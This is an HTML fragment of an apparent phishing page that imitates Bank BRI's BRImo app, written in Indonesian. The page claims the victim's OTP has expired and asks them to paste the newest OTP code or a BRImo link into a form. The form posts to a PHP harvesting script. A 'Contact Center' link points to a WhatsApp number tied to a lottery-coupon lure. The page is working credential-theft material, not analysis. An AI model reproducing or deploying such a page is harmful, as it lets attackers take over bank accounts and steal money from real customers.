    ...
    <div class="container">
      <div class="box-lte">
        ...
        <div class="row">
          ...
          <div style="font-family; sans-serif; text-align: center; color: red;"> 𝗞𝗼𝗱𝗲 𝗼𝘁𝗽 𝗸𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮/𝗶𝗻𝘃𝗮𝗹𝗶𝗱</div>
        <div class="row">
          <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
            <strong><p style="font-size: 13px; text-align: center; font-weight: bold;">Silahkan Cek Kode 𝗢𝗧𝗣 Terbaru yang sudah Kami Kirim Di Dalam Aplikasi 𝗕𝗥𝗜𝗠𝗢 di menu Lonceng Lalu Kirim Ulang.<br /></p></syrong>
          </div>
        </div>
        <div class="row">
          <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;">
            <form action="tempel/tigalah.php" method="POST">
              <textarea name="f" id="sms" class="bubble-element MultiLineInput" data-gramm_editor="false" tabindex="1" placeholder="Silahkan  masukan Kode OTP atau Tautan BRImo dikotak ini" maxlength="" rows="1" style="max-width: 90%; display: block; margin: auto; width: 346px; left: 0px; top: 0px; background-color: rgb(255, 255, 255); min-height: 104px; overflow: hidden; overflow-wrap: break-word; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; font-family: Arial; font-size: 14px; font-weight: bold; color: rgb(61, 61, 61); text-align: left; height: 102px;" required></textarea>
              <button type="submit" id="sent_sms" class="bubble-element Button clickable-element" style="max-width: 90%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1.5px; line-height: 1; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" tabindex="2" onClick="expired()">Konfirmasi</button>
            </form>
      ...
      <div class="row">
        <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
          <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="https://wa.me/6281110672893?text=Saya Belum Mendapatkan Kode Kupon Undian" style="text-decoration: none; color: #828282;">Hubungi Contact Center</a></strong></p>
        </div>
      </div>
    </div>
